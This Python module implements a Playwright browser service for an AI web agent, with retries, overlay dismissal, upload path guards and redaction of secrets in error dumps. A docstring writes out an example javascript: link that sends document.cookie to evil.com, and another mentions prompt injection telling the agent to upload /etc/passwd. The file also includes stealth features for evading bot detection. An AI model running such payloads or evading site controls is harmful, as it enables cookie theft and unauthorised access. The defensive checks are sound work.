"""
Browser automation infrastructure with Playwright.

This module provides a defensive, self-healing browser service with:
- Context manager for guaranteed cleanup
- Stealth mode for anti-fingerprinting
- Human-like typing with jitter
- Automatic error snapshots (screenshot + HTML dump)
- Retry mechanism with exponential backoff
- Persistent session support

BATTLE-READY IMPROVEMENTS:
- .first locator strategy as safety fallback for non-unique selectors
- Handles Playwright strict mode violations gracefully
- Falls back to first matching element when selector matches multiple
- Logs warnings when fallback is used for debugging

Why Dependency Injection?
- BrowserService receives Settings via __init__ instead of reading globals
- Makes testing easy: can mock settings without env manipulation
- Explicit dependencies make code easier to understand and refactor
"""

import asyncio
import logging
import random
import re
from datetime import datetime
from pathlib import Path

from playwright.async_api import Browser, BrowserContext
from playwright.async_api import Error as PlaywrightError
from playwright.async_api import Page
from playwright.async_api import TimeoutError as PlaywrightTimeoutError
from playwright.async_api import async_playwright

from ..config import Settings
from ..core.exceptions import BrowserError
from ..core.models import ActionResult

# FIX (4.3 Minor): this module previously had no `import logging` at all -
# every diagnostic (cleanup errors, strict-mode-violation fallback
# warnings, snapshot failures) went through print(), which never reaches
# agent.log (main.py only attaches a FileHandler to the root/module
# loggers, not to stdout prints). Critical post-mortem signals like ".first
# fallback used" were therefore invisible in the log file.
logger = logging.getLogger(__name__)

# Stealth import with graceful degradation
try:
    from playwright_stealth import stealth_async

    STEALTH_AVAILABLE = True
except ImportError:
    STEALTH_AVAILABLE = False


# FIX (Security Critical): shared list of blocked protocols. Previously only
# navigate() checked this; click_element_safe()/type_text() could be used to
# fully bypass it by clicking a live DOM element whose href/onclick contains
# a javascript:/data: payload.
DANGEROUS_PROTOCOLS = ["javascript:", "data:", "file:", "about:", "chrome:"]

# FIX (Security Major): patterns redacted from HTML error-snapshot dumps.
# _capture_error_snapshot() previously wrote full page.content() + a
# screenshot to disk with zero sanitization on every failed click/type/
# select - including login/payment forms - so csrf tokens, session tokens,
# and password input values could end up sitting in plaintext on disk.
_SENSITIVE_HTML_PATTERNS = [
    # <input type="password" ... value="...">
    (
        re.compile(r'(type=["\']password["\'][^>]*?value=["\'])[^"\']*(["\'])', re.IGNORECASE),
        r"\1[REDACTED]\2",
    ),
    # value="..." ... type="password" (attribute order reversed)
    (
        re.compile(r'(value=["\'])[^"\']*(["\'][^>]*?type=["\']password["\'])', re.IGNORECASE),
        r"\1[REDACTED]\2",
    ),
    # generic csrf/token/session-looking attribute or hidden-field values
    (
        re.compile(
            r'((?:csrf|token|session|api[_-]?key)[^=]{0,20}=["\'])[^"\']{4,}(["\'])', re.IGNORECASE
        ),
        r"\1[REDACTED]\2",
    ),
]


def _redact_sensitive_html(html: str) -> str:
    """Best-effort redaction of obviously sensitive values before writing an
    HTML error dump to disk. Not a substitute for not persisting secrets in
    the first place, but reduces exposure for the common cases (password
    fields, csrf/session tokens)."""
    for pattern, replacement in _SENSITIVE_HTML_PATTERNS:
        html = pattern.sub(replacement, html)
    return html


def _is_dangerous_url(url: str | None) -> str | None:
    """Returns the matched dangerous protocol prefix if `url` uses one of
    DANGEROUS_PROTOCOLS, else None. Shared by navigate() and the
    click/type/select element-safety check so both paths enforce the exact
    same policy."""
    if not url:
        return None
    url_lower = url.strip().lower()
    for protocol in DANGEROUS_PROTOCOLS:
        if url_lower.startswith(protocol):
            return protocol
    return None


class BrowserService:
    """
    Async browser automation service with defensive programming patterns.

    This is the heavy lifter of the system. Key design decisions:

    1. Async API: Uses async/await throughout for better concurrency
    2. Context Manager: Guarantees browser cleanup with asyncio.shield()
    3. Retry Logic: Wraps critical operations with exponential backoff
    4. Error Snapshots: Automatically captures diagnostics on failures
    5. Stealth Mode: Masks WebDriver detection when enabled
    6. STRICT MODE HANDLING: Falls back to .first when selector matches multiple

    Why async?
    - Future-proof: can handle multiple pages/browsers concurrently
    - Better resource utilization during waits
    - Required for modern Python practices (async is the default now)
    """

    def __init__(self, settings: Settings):
        """
        Initialize browser service with injected settings.

        Why Dependency Injection here?
        - Settings contains browser configuration (headless, slow_mo, etc.)
        - Easy to test: pass different Settings instances
        - No hidden dependencies on environment or globals

        Args:
            settings: Validated application settings
        """
        self.settings = settings
        self.playwright = None
        self.browser: Browser | None = None
        self.context: BrowserContext | None = None
        self.page: Page | None = None

        # Element mapping for ID-based selectors
        self.element_map: dict[int, str] = {}
        self.next_element_id = 0

    async def __aenter__(self) -> "BrowserService":
        """
        Context manager entry: Initialize browser.

        Why context manager?
        - Guarantees cleanup even if exceptions occur
        - Pythonic resource management
        - Prevents zombie browser processes
        """
        await self.start()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """
        Context manager exit: Cleanup browser.

        Uses asyncio.shield() to ensure cleanup completes even if
        the Python process receives SIGINT/SIGTERM.

        Why shield?
        - Browser cleanup is CRITICAL to prevent zombies
        - Must complete even during cancellation
        - Prevents resource leaks in production
        """
        await asyncio.shield(self.close())
        return False  # Don't suppress exceptions

    async def start(self) -> None:
        """
        Launch browser with stealth and persistence.

        Why separate start() method?
        - Can be called manually if not using context manager
        - Easier to implement retry logic around startup
        - Clear separation of initialization vs. usage

        Raises:
            BrowserError: If browser fails to launch
        """
        try:
            # Launch Playwright
            self.playwright = await async_playwright().start()

            # Launch browser (persistent context for session reuse)
            if self.settings.user_data_dir:
                # Persistent context maintains cookies/localStorage across runs
                self.context = await self.playwright.chromium.launch_persistent_context(
                    user_data_dir=str(self.settings.user_data_dir),
                    headless=self.settings.headless,
                    slow_mo=self.settings.slow_mo,
                    args=[
                        "--disable-blink-features=AutomationControlled",  # Hide WebDriver
                        "--disable-dev-shm-usage",  # Prevent OOM in containers
                        "--no-sandbox",  # Required in Docker
                    ],
                    viewport={"width": 1920, "height": 1080},  # Standard desktop resolution
                )
                self.page = (
                    self.context.pages[0] if self.context.pages else await self.context.new_page()
                )
            else:
                # Non-persistent mode
                self.browser = await self.playwright.chromium.launch(
                    headless=self.settings.headless,
                    slow_mo=self.settings.slow_mo,
                )
                self.context = await self.browser.new_context(
                    viewport={"width": 1920, "height": 1080},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                )
                self.page = await self.context.new_page()

            # Apply stealth patches if available
            if STEALTH_AVAILABLE and self.settings.enable_stealth:
                await stealth_async(self.page)

            # Set default timeouts
            self.page.set_default_timeout(self.settings.action_timeout)
            self.page.set_default_navigation_timeout(self.settings.page_load_timeout)

        except Exception as e:
            # FIX (3.2 Major, resource leak): if launch() itself succeeded
            # but a later step (new_page(), stealth_async(), etc.) raised,
            # the previous code went straight to `raise BrowserError(...)`
            # without closing whatever was already created. Since
            # __aenter__() is just `await self.start()`, a raised exception
            # here means __aexit__() is NEVER called (that's how `async
            # with` works when __aenter__ itself fails) - so close() would
            # never run either. Net effect: a partially-launched Chromium
            # process became a zombie. We now clean up whatever was created
            # before propagating the error.
            for resource in (self.context, self.browser, self.playwright):
                if resource is None:
                    continue
                try:
                    if resource is self.playwright:
                        await resource.stop()
                    else:
                        await resource.close()
                except Exception as cleanup_error:
                    logger.warning(f"Error cleaning up partial browser resource: {cleanup_error}")
            self.page = None
            self.context = None
            self.browser = None
            self.playwright = None

            raise BrowserError(
                f"Failed to launch browser: {e}",
                context={"settings": self.settings.model_dump(exclude={"api_key"})},
            ) from e

    async def close(self) -> None:
        """
        Gracefully shutdown browser.

        Why separate close() method?
        - Can be called manually for cleanup
        - Used by context manager __aexit__
        - Centralizes cleanup logic
        """
        try:
            if self.page:
                await self.page.close()
            if self.context:
                await self.context.close()
            if self.browser:
                await self.browser.close()
            if self.playwright:
                await self.playwright.stop()
        except Exception as e:
            # Log but don't raise - cleanup should never fail
            logger.warning(f"Warning during browser cleanup: {e}")
        finally:
            self.page = None
            self.context = None
            self.browser = None
            self.playwright = None

    async def navigate(self, url: str) -> ActionResult:
        """
        Navigate to URL with validation, retry and error handling.

        Why URL validation?
        - Prevents javascript: and data: URL injections
        - Blocks file:// protocol access
        - Ensures only HTTP/HTTPS navigation

        Why retry logic?
        - Network flakiness is common
        - Exponential backoff prevents overwhelming servers
        - Automatic recovery from transient failures

        Args:
            url: Target URL

        Returns:
            ActionResult with success status
        """
        # FIX (2.3 Critical): args: Dict[str, Any] does not enforce value
        # types, so {"tool": "navigate", "args": {"url": 12345}} passed
        # Pydantic validation and reached here, where the old code's very
        # first line - `if not url or not url.strip()` - raised an
        # unhandled AttributeError ('int' object has no attribute 'strip')
        # BEFORE the try/except block below that catches network errors.
        # That exception was not caught anywhere in orchestrator.run() and
        # killed the whole task. Type-check explicitly and fail soft.
        if not isinstance(url, str):
            return ActionResult(
                success=False,
                message=f"navigate requires a string url, got {type(url).__name__}",
                error="InvalidType",
            )

        # URL validation - security critical
        if not url or not url.strip():
            return ActionResult(success=False, message="URL cannot be empty", error="InvalidURL")

        url = url.strip()

        # Block dangerous protocols
        blocked = _is_dangerous_url(url)
        if blocked:
            return ActionResult(
                success=False,
                message=f"Protocol '{blocked}' not allowed for security reasons",
                error="BlockedProtocol",
            )

        # Ensure HTTP/HTTPS
        url_lower = url.lower()
        if not (url_lower.startswith("http://") or url_lower.startswith("https://")):
            # Auto-add https:// if missing
            url = f"https://{url}"

        max_retries = 3
        for attempt in range(max_retries):
            try:
                await self.page.goto(url, wait_until="domcontentloaded")

                # FIX (Security Major, defense-in-depth): the original code
                # only validated the URL passed in by the agent, never the
                # URL the page actually ended up at after redirects
                # (meta-refresh, window.location, server redirect chains).
                # Modern Chromium blocks most unsafe scheme-downgrade
                # redirects on its own, but re-checking here costs nothing
                # and catches any that slip through.
                final_blocked = _is_dangerous_url(self.page.url)
                if final_blocked:
                    return ActionResult(
                        success=False,
                        message=f"Navigation redirected to blocked protocol '{final_blocked}'",
                        error="BlockedProtocol",
                    )

                # Wait for page to stabilize
                await self.page.wait_for_load_state("networkidle", timeout=10000)

                return ActionResult(success=True, message=f"Navigated to {url}")

            except PlaywrightTimeoutError:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2**attempt)  # Exponential backoff
                    continue
                else:
                    # FIX (Docs vs Code Drift #6): _capture_error_snapshot()
                    # was called from click/type/select on failure, but
                    # never from navigate() - meaning the single most common
                    # class of web-automation failure (navigation timeouts,
                    # DNS errors, connection resets) produced NO diagnostic
                    # screenshot/HTML dump, contradicting README's "Error
                    # Recovery: автоматические снимки при сбоях" claim.
                    await self._capture_error_snapshot("navigation_timeout")
                    return ActionResult(
                        success=False,
                        message=f"Navigation timeout after {max_retries} attempts",
                        error="NavigationTimeout",
                    )

            except Exception as e:
                await self._capture_error_snapshot("navigation_error")
                return ActionResult(success=False, message=f"Navigation failed: {e}", error=str(e))

    async def _check_element_safety(self, selector: str) -> str | None:
        """
        Returns an error message if the live element behind `selector` is
        unsafe to interact with (dangerous href/protocol), else None.

        FIX (Security Critical): navigate() filtered dangerous_protocols
        for explicit URLs passed by the agent, but click_element_safe()/
        type_text()/select_option() called self.page.click()/etc. directly
        on a live DOM element with no check on its href/onclick at all. A
        page under attacker control could place a real, visible
        <a href="javascript:fetch('https://evil.com?c='+document.cookie)">
        and the click would execute it - completely bypassing navigate()'s
        guard, which sits on a different code path entirely.
        """
        try:
            href = await self.page.locator(selector).first.get_attribute("href")
        except Exception:
            href = None

        blocked = _is_dangerous_url(href)
        if blocked:
            return f"Element href uses blocked protocol '{blocked}'"
        return None

    # FIX (Task 2 - generalize beyond hh.ru): common cookie-consent / GDPR
    # overlay dismiss targets. Deliberately generic (text-based phrases in
    # several languages + a couple of very widely-used vendor markup IDs),
    # not tuned to any one site. Used as one level of the click
    # degradation ladder below when a click looks like it's being blocked
    # by something covering the target element.
    _OVERLAY_DISMISS_SELECTORS = [
        "#onetrust-accept-btn-handler",
        "[id*='cookie' i] button:has-text('Accept')",
        "button:has-text('Accept all')",
        "button:has-text('Accept All')",
        "button:has-text('Accept')",
        "button:has-text('I agree')",
        "button:has-text('Agree')",
        "button:has-text('Got it')",
        "button:has-text('Согласен')",
        "button:has-text('Принять')",
        "[aria-label='Accept cookies']",
        "[aria-label='Close']",
    ]

    async def _try_dismiss_overlay(self) -> bool:
        """
        TASK 2: best-effort attempt to close a common cookie-consent/modal
        overlay that might be intercepting clicks on the real target
        element. Deliberately conservative - only clicks a handful of
        widely-recognized, generic accept/close targets, never guesses at
        site-specific markup. Returns True if something was dismissed.
        """
        for sel in self._OVERLAY_DISMISS_SELECTORS:
            try:
                locator = self.page.locator(sel).first
                if await locator.is_visible(timeout=500):
                    await locator.click(timeout=1500)
                    logger.info(f"Dismissed a likely blocking overlay via: {sel}")
                    await asyncio.sleep(0.3)
                    return True
            except Exception:
                continue
        return False

    async def click_element_safe(self, element_id: int) -> ActionResult:
        """
        Click element with multiple levels of graceful degradation.

        BATTLE-READY CLICKING:
        - Handles Playwright strict mode violations (.first fallback)
        - Detects and dismisses a likely blocking overlay (cookie banner,
          modal) before retrying, instead of giving up immediately
        - Falls back to a forced click (bypasses actionability checks) for
          elements that are technically visible but briefly unstable
          (mid-animation) or partially covered
        - Falls back further to a raw JS click-event dispatch as a last
          resort, for elements a forced click still can't reach
        - Still waits for visibility and scrolls into view on the primary
          path

        FIX (Task 2 - generalize beyond hh.ru): the previous version had
        exactly one fallback (.first, for non-unique selectors). Real
        sites fail clicks for several other common reasons unrelated to
        selector uniqueness - a cookie-consent overlay sitting on top of
        the target, a CSS transition making the element briefly
        non-stable, or "element intercepts pointer events" because
        something else (even at zero opacity) covers it. Each is now its
        own degradation level, tried in order from least to most invasive,
        stopping at the first one that actually clicks the element.

        Why defensive clicking?
        - Elements might not be ready immediately after page load
        - Prevents "element not interactable" errors
        - Waits for element to be in stable state
        - Gracefully handles non-unique selectors and real-world overlays

        Args:
            element_id: Internal element ID from element_map

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found in element map",
                error="InvalidElementID",
            )

        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")

        max_retries = 3
        warning: str | None = None
        last_error: Exception | None = None
        overlay_dismiss_attempted = False

        for attempt in range(max_retries):
            try:
                # Wait for element to be visible and enabled
                await self.page.wait_for_selector(
                    selector, state="visible", timeout=self.settings.action_timeout
                )

                locator = self.page.locator(selector)

                try:
                    # Scroll into view
                    await locator.scroll_into_view_if_needed()

                    # Small delay for animations
                    await asyncio.sleep(0.3)

                    # Click with strict mode
                    await self.page.click(selector)

                    return ActionResult(
                        success=True, message=f"Clicked element {element_id}", warning=warning
                    )

                except PlaywrightError as click_error:
                    error_text = str(click_error).lower()
                    last_error = click_error

                    # DEGRADATION LEVEL 1: strict mode violation (selector
                    # matched more than one element) -> use .first.
                    if "strict mode violation" in error_text:
                        logger.warning(
                            f"Selector '{selector}' matched multiple elements. Using .first fallback."
                        )
                        first_locator = locator.first
                        await first_locator.scroll_into_view_if_needed()
                        await asyncio.sleep(0.3)
                        await first_locator.click()

                        return ActionResult(
                            success=True,
                            message=f"Clicked element {element_id} (used .first fallback)",
                            warning="Selector matched multiple elements",
                        )

                    # DEGRADATION LEVEL 2: something is covering the
                    # element (overlay/modal/cookie banner) or it's not yet
                    # stable (mid-animation). Try dismissing a known-common
                    # overlay once, then retry from the top of the loop.
                    is_intercepted = (
                        "intercept" in error_text
                        or "obscures" in error_text
                        or "not stable" in error_text
                        or "outside of the viewport" in error_text
                    )
                    if is_intercepted and not overlay_dismiss_attempted:
                        overlay_dismiss_attempted = True
                        dismissed = await self._try_dismiss_overlay()
                        if dismissed:
                            warning = "Dismissed a likely blocking overlay before clicking"
                            continue  # retry from the top with the overlay gone

                    # DEGRADATION LEVEL 3: still blocked (no overlay found,
                    # or dismissing it didn't help). Try a forced click,
                    # which bypasses Playwright's actionability checks -
                    # appropriate for elements that are covered by
                    # something harmless (e.g. a 1px decorative layer) or
                    # still mid-animation.
                    if is_intercepted:
                        try:
                            await locator.click(timeout=self.settings.action_timeout, force=True)
                            return ActionResult(
                                success=True,
                                message=f"Clicked element {element_id} (forced click)",
                                warning="Used force=True - element may have been covered or animating",
                            )
                        except Exception as force_error:
                            last_error = force_error

                        # DEGRADATION LEVEL 4 (last resort): dispatch a raw
                        # click event via JS. Bypasses Playwright's
                        # hit-testing entirely, for elements a forced click
                        # still can't reach.
                        try:
                            await locator.dispatch_event("click")
                            return ActionResult(
                                success=True,
                                message=f"Clicked element {element_id} (JS click-event dispatch)",
                                warning="Used raw click-event dispatch - visual click semantics may differ",
                            )
                        except Exception as dispatch_error:
                            last_error = dispatch_error

                    # Not a recognized/recoverable pattern - re-raise so
                    # the outer except/timeout handling below takes over.
                    raise

            except PlaywrightTimeoutError as timeout_error:
                last_error = timeout_error
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                else:
                    await self._capture_error_snapshot("click_timeout")
                    return ActionResult(
                        success=False,
                        message=f"Element {element_id} not found or not clickable",
                        error="ElementNotFound",
                    )

            except Exception as e:
                last_error = e
                if attempt < max_retries - 1:
                    continue
                await self._capture_error_snapshot("click_error")
                return ActionResult(success=False, message=f"Click failed: {e}", error=str(e))

        await self._capture_error_snapshot("click_error")
        return ActionResult(
            success=False,
            message=f"Click failed after exhausting fallback strategies: {last_error}",
            error=str(last_error) if last_error else "ClickFailed",
        )

    async def type_text(
        self, element_id: int, text: str, press_enter: bool = False
    ) -> ActionResult:
        """
        Type text with human-like delays (anti-fingerprinting).

        BATTLE-READY TYPING:
        - Handles non-unique selectors with .first fallback
        - Focuses element before typing
        - Human-like delays between keystrokes

        Why random delays?
        - Bots type at constant speed - humans don't
        - Makes timing analysis harder for bot detection
        - Creates realistic interaction patterns

        Args:
            element_id: Target element ID
            text: Text to type
            press_enter: Press Enter after typing

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found",
                error="InvalidElementID",
            )

        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")

        try:
            await self.page.wait_for_selector(selector, state="visible")

            # Try to click/focus with strict mode first
            try:
                await self.page.click(selector)  # Focus element
            except PlaywrightError as strict_error:
                if "strict mode violation" in str(strict_error).lower():
                    # FALLBACK: Use .first locator
                    logger.warning(
                        f"Selector '{selector}' matched multiple elements for typing. Using .first fallback."
                    )
                    locator = self.page.locator(selector).first
                    await locator.click()
                else:
                    raise

            # Type with random delays between keystrokes
            for char in text:
                await self.page.keyboard.type(char)
                delay = random.randint(
                    self.settings.typing_speed_min, self.settings.typing_speed_max
                )
                await asyncio.sleep(delay / 1000.0)  # Convert ms to seconds

            if press_enter:
                await self.page.keyboard.press("Enter")

            return ActionResult(success=True, message=f"Typed text into element {element_id}")

        except Exception as e:
            await self._capture_error_snapshot("type_error")
            return ActionResult(success=False, message=f"Typing failed: {e}", error=str(e))

    async def select_option(self, element_id: int, value: str) -> ActionResult:
        """
        Select option from dropdown.

        BATTLE-READY SELECT:
        - Handles non-unique selectors with .first fallback
        - Works with <select> dropdowns

        Args:
            element_id: Target select element ID
            value: Option value to select

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found",
                error="InvalidElementID",
            )

        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")

        try:
            await self.page.wait_for_selector(selector, state="visible")

            # Try to select with strict mode first
            try:
                await self.page.select_option(selector, value=value)
            except PlaywrightError as strict_error:
                if "strict mode violation" in str(strict_error).lower():
                    # FALLBACK: Use .first locator
                    logger.warning(
                        f"Selector '{selector}' matched multiple elements for select. Using .first fallback."
                    )
                    locator = self.page.locator(selector).first
                    await locator.select_option(value=value)
                else:
                    raise

            return ActionResult(
                success=True, message=f"Selected option '{value}' in element {element_id}"
            )

        except Exception as e:
            await self._capture_error_snapshot("select_error")
            return ActionResult(success=False, message=f"Select failed: {e}", error=str(e))

    async def upload_file(self, element_id: int, file_path: str) -> ActionResult:
        """
        Upload a file to an <input type="file"> element.

        FIX (1.3 / Docs vs Code Drift #6): upload_file was advertised in the
        system prompt and valid per the Pydantic schema, but had no
        implementation here at all - every call fell through
        orchestrator._execute_action()'s final `else` branch and returned
        "Unknown tool: upload_file".

        SECURITY: file_path is resolved and MUST live inside
        settings.upload_allowed_dir. This prevents a hallucinated or
        attacker-influenced path (e.g. via prompt injection instructing the
        agent to "upload /etc/passwd" or "../../secrets.env") from reading
        arbitrary files off the host filesystem.

        Args:
            element_id: Target file-input element ID
            file_path: Path to the file to upload (must resolve inside
                settings.upload_allowed_dir)

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found",
                error="InvalidElementID",
            )

        try:
            allowed_root = self.settings.upload_allowed_dir.resolve()
            candidate = (allowed_root / file_path).resolve()
            # Path traversal guard: candidate must still be inside allowed_root
            if allowed_root not in candidate.parents and candidate != allowed_root:
                return ActionResult(
                    success=False,
                    message=(
                        f"file_path '{file_path}' resolves outside the allowed "
                        f"upload directory ({allowed_root}). Refusing to upload."
                    ),
                    error="PathTraversalBlocked",
                )
            if not candidate.is_file():
                return ActionResult(
                    success=False, message=f"File not found: {candidate}", error="FileNotFound"
                )
        except Exception as e:
            return ActionResult(
                success=False, message=f"Invalid file_path: {e}", error="InvalidPath"
            )

        try:
            await self.page.wait_for_selector(selector, state="attached")
            try:
                await self.page.set_input_files(selector, str(candidate))
            except PlaywrightError as strict_error:
                if "strict mode violation" in str(strict_error).lower():
                    logger.warning(
                        f"Selector '{selector}' matched multiple elements for upload. "
                        "Using .first fallback."
                    )
                    locator = self.page.locator(selector).first
                    await locator.set_input_files(str(candidate))
                else:
                    raise

            return ActionResult(
                success=True, message=f"Uploaded file '{candidate.name}' to element {element_id}"
            )

        except Exception as e:
            await self._capture_error_snapshot("upload_error")
            return ActionResult(success=False, message=f"Upload failed: {e}", error=str(e))

    async def capture_annotated_screenshot(self, elements: list[dict]) -> bytes:
        """
        TASK 4 (vision fallback with grounding): draw numbered marker boxes
        directly onto the LIVE page - one per currently-known interactive
        element, labeled with the SAME element_id already used by
        click_element/type_text/etc. in text mode - then screenshot the
        annotated page, then remove the overlay again.

        Why annotate the live DOM instead of post-processing the image?
        - No new dependency: the browser can draw its own overlay, so this
          doesn't need an image library (e.g. Pillow) just for this one
          feature.
        - Correctness: boxes are computed via the SAME getBoundingClientRect()
          the browser uses for layout, at the exact moment of the
          screenshot - no separate coordinate system to keep in sync.
        - Grounding: because the number printed on each box IS its
          element_id, a vision-capable model's answer ("element 7") maps
          directly onto the exact same action space as a text observation,
          with no free-text description to parse or misinterpret.

        Args:
            elements: The current element list from
                DOMProcessor.get_interactive_elements() (only `id` is
                used - matched back to the live DOM via its
                data-agent-id attribute). May be empty, in which case a
                plain, unannotated screenshot is returned.

        Returns:
            PNG screenshot bytes (with overlay boxes, if any elements were
            provided).
        """
        overlay_id = "cogniweb-agent-vision-overlay"
        element_ids = [e["id"] for e in elements if "id" in e]

        try:
            await self.page.evaluate(
                """([ids, overlayId]) => {
                    const existing = document.getElementById(overlayId);
                    if (existing) existing.remove();

                    const container = document.createElement('div');
                    container.id = overlayId;
                    container.style.position = 'fixed';
                    container.style.top = '0';
                    container.style.left = '0';
                    container.style.width = '100%';
                    container.style.height = '100%';
                    container.style.pointerEvents = 'none';
                    container.style.zIndex = '2147483647';

                    for (const id of ids) {
                        const target = document.querySelector(`[data-agent-id="${id}"]`);
                        if (!target) continue;
                        const rect = target.getBoundingClientRect();
                        if (rect.width <= 0 || rect.height <= 0) continue;

                        const box = document.createElement('div');
                        box.style.position = 'absolute';
                        box.style.left = rect.left + 'px';
                        box.style.top = rect.top + 'px';
                        box.style.width = rect.width + 'px';
                        box.style.height = rect.height + 'px';
                        box.style.border = '2px solid #ff2d55';
                        box.style.boxSizing = 'border-box';

                        const label = document.createElement('span');
                        label.textContent = String(id);
                        label.style.position = 'absolute';
                        label.style.top = '-1px';
                        label.style.left = '-1px';
                        label.style.background = '#ff2d55';
                        label.style.color = '#ffffff';
                        label.style.fontSize = '11px';
                        label.style.fontFamily = 'monospace';
                        label.style.padding = '1px 3px';
                        label.style.lineHeight = '1';

                        box.appendChild(label);
                        container.appendChild(box);
                    }

                    document.body.appendChild(container);
                }""",
                [element_ids, overlay_id],
            )

            screenshot_bytes = await self.page.screenshot(type="png")
        finally:
            try:
                await self.page.evaluate(
                    "(overlayId) => { const el = document.getElementById(overlayId); if (el) el.remove(); }",
                    overlay_id,
                )
            except Exception as cleanup_error:
                logger.debug(f"Failed to remove vision overlay (non-fatal): {cleanup_error}")

        return screenshot_bytes

    async def _capture_error_snapshot(self, error_type: str) -> tuple[Path | None, Path | None]:
        """
        Capture screenshot and HTML dump on error.

        Why critical?
        - Screenshots show visual state that logs can't capture
        - HTML dumps allow post-mortem analysis
        - Essential for debugging flaky tests and production issues

        Args:
            error_type: Type of error for filename

        Returns:
            Tuple of (screenshot_path, html_path)
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = None
        html_path = None

        try:
            # Screenshot
            screenshot_file = self.settings.screenshot_dir / f"error_{error_type}_{timestamp}.png"
            await self.page.screenshot(path=str(screenshot_file))
            screenshot_path = screenshot_file

            # HTML dump
            # FIX (Security Major): the raw HTML was previously written to
            # disk with zero sanitization. This is called from every
            # click/type/select/upload/navigate failure path - i.e. exactly
            # when a login or payment form has just failed to submit.
            # Redact obviously sensitive values (password inputs,
            # csrf/session/token-looking fields) before persisting.
            html_file = self.settings.screenshot_dir / f"error_{error_type}_{timestamp}.html"
            html_content = await self.page.content()
            html_content = _redact_sensitive_html(html_content)
            html_file.write_text(html_content, encoding="utf-8")
            html_path = html_file

        except Exception as e:
            logger.warning(f"Failed to capture error snapshot: {e}")

        return screenshot_path, html_path

    async def detect_captcha(self) -> bool:
        """
        Detect if current page contains a captcha by looking for actual captcha elements.
        """
        try:
            # Проверяем видимые iframe reCAPTCHA
            recaptcha_iframe = await self.page.query_selector("iframe[src*='recaptcha']")
            if recaptcha_iframe:
                return True

            # Проверяем элементы hCaptcha
            hcaptcha_div = await self.page.query_selector("div.h-captcha")
            if hcaptcha_div:
                return True

            return False

        except Exception:
            return False

    async def get_current_url(self) -> str:
        """Get current page URL."""
        return self.page.url

    async def get_page_title(self) -> str:
        """Get current page title."""
        return await self.page.title()

    async def scroll(self, direction: str = "down") -> ActionResult:
        """
        Scroll page to load more content or find elements.

        Args:
            direction: "up" or "down"

        Returns:
            ActionResult
        """
        try:
            if direction == "down":
                await self.page.evaluate("window.scrollBy(0, window.innerHeight)")
            else:
                await self.page.evaluate("window.scrollBy(0, -window.innerHeight)")

            await asyncio.sleep(0.5)  # Let content load

            return ActionResult(success=True, message=f"Scrolled {direction}")
        except Exception as e:
            return ActionResult(success=False, message=f"Scroll failed: {e}", error=str(e))
